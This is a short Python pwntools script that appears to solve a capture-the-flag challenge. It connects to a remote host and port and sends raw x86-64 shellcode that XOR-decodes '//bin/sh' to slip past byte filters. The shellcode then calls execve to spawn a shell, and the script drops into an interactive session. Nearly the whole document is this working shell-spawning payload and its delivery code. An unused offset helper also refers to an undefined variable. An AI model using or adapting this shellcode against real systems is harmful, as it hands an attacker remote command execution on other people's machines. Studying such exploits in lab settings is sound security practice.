#!/usr/bin/python3

from pwn import *

exe = ELF("execute", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "INFO"
isDebug = False

gs = '''
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
# io = start_local(isDebug)
# io.timeout = 0.02

######## REMOTE ########
io = remote("83.136.255.41", 47744)

shellcode_bin = bytes([
    0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xee, 0x01, 0xba, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xea, 0x01, 0x50, 0x48, 0xbb, 0x3f,
    0x3f, 0x72, 0x79, 0x7e, 0x3f, 0x63, 0x78, 0x48, 0xb9, 0x10, 0x10,
    0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x48, 0x31, 0xcb, 0x53, 0x48,
    0x89, 0xe7, 0xb0, 0x3a, 0x04, 0x01, 0x0f, 0x05
])
shellcode_bin_len = len(shellcode_bin)

io.send(shellcode_bin)

io.interactive()
